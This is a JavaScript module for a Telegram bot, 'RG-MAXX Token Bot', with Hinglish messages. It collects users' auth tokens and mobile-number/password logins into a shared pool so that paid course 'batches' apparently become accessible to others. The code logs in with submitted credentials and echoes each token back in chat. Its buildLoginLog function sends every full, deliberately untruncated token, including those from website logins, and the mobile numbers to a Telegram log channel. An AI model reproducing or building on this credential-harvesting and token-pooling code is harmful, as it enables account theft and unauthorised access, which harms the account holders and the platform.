// lib/telegram.js — v10
// ✅ FULL token in logs (no truncation)
// ✅ Telegram token section support
// ✅ Today login count tracking
// ✅ Bot log history stored

import fetch from "node-fetch";
import { addToken, removeToken, getTokenCount, removeBySource } from "./tokenStore.js";
import { fetchUserBatches, loginWithCredentials } from "./fetchBatches.js";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const LOG_CHANNEL = process.env.TELEGRAM_LOG_CHANNEL_ID;

// ── In-memory log history (last 50 events) ──────────────────────────────────
const logHistory = [];
let todayLoginCount = 0;
let lastResetDate = new Date().toDateString();

function checkDayReset() {
  const today = new Date().toDateString();
  if (today !== lastResetDate) {
    todayLoginCount = 0;
    lastResetDate = today;
  }
}

export function getTodayLoginCount() {
  checkDayReset();
  return todayLoginCount;
}

export function getLogHistory() {
  return logHistory.slice(-50);
}

function addToHistory(entry) {
  checkDayReset();
  todayLoginCount++;
  logHistory.push({
    ...entry,
    timestamp: new Date().toISOString(),
  });
  if (logHistory.length > 100) logHistory.shift();
}

// ─── Send to log channel ────────────────────────────────────────────────────
export async function sendLog(text) {
  if (!BOT_TOKEN || !LOG_CHANNEL) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: LOG_CHANNEL,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error("[Telegram] sendLog error:", e.message);
  }
}

// ─── Build login log — FULL TOKEN (no truncation) ───────────────────────────
export function buildLoginLog(userId, token, batches, source = "website", extraInfo = "") {
  // ✅ FULL TOKEN — poora token jaayega Telegram pe
  const fullToken = token || "N/A";

  const batchLines =
    batches.length > 0
      ? batches.map((b) => `  📌 [${b.id}] ${b.name}`).join("\n")
      : "  (no batches found)";

  const sourceEmoji =
    source === "telegram" ? "🤖 Telegram Bot"
    : source === "id_pass" ? "🔐 ID+Password Login"
    : source === "manual" ? "📋 Manual (users.js)"
    : "🌐 Website Login";

  const extraLine = extraInfo ? `\n📝 Info: <code>${extraInfo}</code>` : "";

  // Add to history
  addToHistory({
    userId,
    tokenPreview: token ? token.substring(0, 30) + "..." : "N/A",
    batchCount: batches.length,
    source,
    extraInfo,
  });

  return `
🔐 <b>New User Added to Pool</b>
━━━━━━━━━━━━━━━━━━━━━
📥 Source: <b>${sourceEmoji}</b>
👤 User ID: <code>${userId}</code>
🔑 Token:
<code>${fullToken}</code>${extraLine}
📚 Batches (<b>${batches.length}</b>):
${batchLines}
⏰ ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST
━━━━━━━━━━━━━━━━━━━━━`.trim();
}

// ─── Process incoming Telegram update ──────────────────────────────────────
export async function processTelegramUpdate(update) {
  const msg = update?.message;
  if (!msg) return;

  const chatId = msg.chat.id;
  const text = (msg.text || "").trim();

  if (text === "/start") {
    await sendTelegramReply(
      chatId,
      `👋 <b>RG-MAXX Token Bot v10</b>\n\n` +
      `<b>Commands:</b>\n` +
      `<code>/add USER_ID TOKEN</code> — Token se add karo\n` +
      `<code>/login MOBILE PASSWORD</code> — ID+Pass se login karo\n` +
      `<code>/remove USER_ID</code> — Token hatao pool se\n` +
      `<code>/disconnect</code> — Telegram se add hue saare tokens hatao\n` +
      `<code>/status</code> — Pool status dekho\n\n` +
      `✅ Token add hone ke baad content accessible ho jaata hai!`
    );
    return;
  }

  if (text === "/status") {
    await sendTelegramReply(chatId, `📊 Pool Status: <b>${getTokenCount()}</b> tokens active\n📅 Today logins: <b>${getTodayLoginCount()}</b>`);
    return;
  }

  if (text === "/disconnect") {
    const removed = removeBySource("telegram");
    await sendTelegramReply(
      chatId,
      `🔌 <b>Disconnected!</b>\n\n` +
      `Telegram se add hue <b>${removed}</b> tokens pool se hat gaye.\n` +
      `Website/manual tokens safe hain. ✅`
    );
    return;
  }

  const removeMatch = text.match(/^\/remove\s+(\S+)/i);
  if (removeMatch) {
    const uid = removeMatch[1];
    const removed = removeToken(uid);
    await sendTelegramReply(
      chatId,
      removed
        ? `✅ User <code>${uid}</code> ka token pool se remove ho gaya.`
        : `❌ User <code>${uid}</code> pool mein nahi mila.`
    );
    return;
  }

  const loginMatch = text.match(/^\/login\s+(\S+)\s+(\S+)/i);
  if (loginMatch) {
    const mobile = loginMatch[1];
    const password = loginMatch[2];
    await sendTelegramReply(chatId, `⏳ Login ho raha hai... batches fetch ho rahe hain...`);
    try {
      const { userId, token } = await loginWithCredentials(mobile, password);
      const batches = await fetchUserBatches(userId, token);
      addToken(userId, token, "", batches, "telegram");

      const batchList =
        batches.length > 0
          ? batches.map((b) => `• [${b.id}] ${b.name}`).join("\n")
          : "(no batches found)";

      await sendTelegramReply(
        chatId,
        `✅ <b>Login Successful!</b>\n\n` +
        `👤 User ID: <code>${userId}</code>\n` +
        `🔑 Token:\n<code>${token}</code>\n` +
        `📚 Batches: <b>${batches.length}</b>\n${batchList}\n\n` +
        `Content ab accessible hai! 🎉`
      );

      await sendLog(buildLoginLog(userId, token, batches, "id_pass", `${mobile} (Telegram Login)`));
    } catch (e) {
      await sendTelegramReply(chatId, `❌ Login failed: ${e.message}`);
    }
    return;
  }

  const addMatch = text.match(/^\/add\s+(\S+)\s+(\S+)/i);
  const plainMatch = text.match(/^(\d+)\s+(eyJ\S+)/);

  let userId, token;
  if (addMatch) {
    userId = addMatch[1];
    token = addMatch[2];
  } else if (plainMatch) {
    userId = plainMatch[1];
    token = plainMatch[2];
  } else {
    await sendTelegramReply(
      chatId,
      `❌ Format samajh nahi aaya.\n\n` +
      `<b>Sahi formats:</b>\n` +
      `<code>/add 123456 eyJ0eXAi...</code>\n` +
      `<code>/login 9876543210 yourpassword</code>`
    );
    return;
  }

  await sendTelegramReply(chatId, `⏳ Token verify aur batches fetch ho rahe hain...`);

  let batches = [];
  try {
    batches = await fetchUserBatches(userId, token);
  } catch (e) {
    await sendTelegramReply(chatId, `⚠️ Batches fetch nahi hue. Error: ${e.message}`);
  }

  addToken(userId, token, "", batches, "telegram");

  const batchList =
    batches.length > 0
      ? batches.map((b) => `• [${b.id}] ${b.name}`).join("\n")
      : "(no batches found)";

  // ✅ FULL TOKEN in reply too
  await sendTelegramReply(
    chatId,
    `✅ <b>Token Added!</b>\n\n` +
    `👤 User ID: <code>${userId}</code>\n` +
    `🔑 Token:\n<code>${token}</code>\n` +
    `📚 Batches: <b>${batches.length}</b>\n${batchList}\n\n` +
    `Content accessible hai! 🎉`
  );

  await sendLog(buildLoginLog(userId, token, batches, "telegram"));
}

export async function sendTelegramReply(chatId, text) {
  if (!BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error("[Telegram] reply error:", e.message);
  }
}

export async function setWebhook(webhookUrl) {
  if (!BOT_TOKEN) return { ok: false, error: "No BOT_TOKEN set" };
  try {
    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: webhookUrl }),
    });
    return resp.json();
  } catch (e) {
    return { ok: false, error: e.message };
  }
}
